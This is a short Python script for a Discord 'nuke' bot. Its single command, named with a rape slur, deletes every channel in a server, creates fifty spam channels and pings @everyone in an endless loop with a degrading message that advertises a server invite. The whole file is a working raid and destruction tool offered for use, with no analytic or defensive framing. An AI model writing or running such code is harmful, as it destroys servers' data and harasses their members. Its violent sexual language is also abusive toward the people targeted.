import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.all()

bot = commands.Bot(command_prefix="!", intents=intents)

TOKEN = 'Your Token'

@bot.event
async def on_ready():
    print(f"Loaded as: {bot.user}")

@bot.command(name="rape")
async def rape(ctx):
    mass_delete = [channel.delete() for channel in ctx.guild.channels]
    await asyncio.gather(*mass_delete)

    create = [ctx.guild.create_text_channel("worm-on-top") for _ in range(50)]
    channels = await asyncio.gather(*create)

    async def ping_channels():
        while True:
            mass_ping = [channel.send("@everyone raped by discord.gg/wrm") for channel in channels]
            await asyncio.gather(*mass_ping)

    ping_task = asyncio.create_task(ping_channels())

bot.run(TOKEN)

  
